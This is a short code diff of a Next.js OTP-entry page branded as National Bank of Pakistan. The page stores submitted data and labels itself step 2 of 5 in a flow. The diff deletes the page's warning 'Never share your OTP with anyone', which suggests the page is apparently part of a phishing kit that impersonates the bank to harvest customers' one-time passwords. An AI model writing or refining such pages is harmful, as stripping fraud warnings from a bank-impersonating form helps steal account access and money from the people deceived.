@@ -2,7 +2,7 @@
 
 import { useEffect, useRef, useState } from 'react'
 import { useRouter } from 'next/navigation'
-import { ChevronRight, TriangleAlert } from 'lucide-react'
+import { ChevronRight } from 'lucide-react'
 import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
@@ -122,14 +122,6 @@ export default function OtpPage() {
             {error ? (
               <p className="mt-3 text-center text-sm font-semibold text-destructive">{error}</p>
             ) : null}
-
-            <div className="otp-warning mt-4">
-              <TriangleAlert aria-hidden="true" className="size-5 shrink-0 text-amber-600" />
-              <p>
-                Never share your OTP with anyone. National Bank of Pakistan will never ask for your OTP over a call or
-                SMS.
-              </p>
-            </div>
 
             <div className="flex items-center justify-center gap-2 py-4" aria-label="Step 2 of 5">
               <span className="step-dot step-dot-done" />
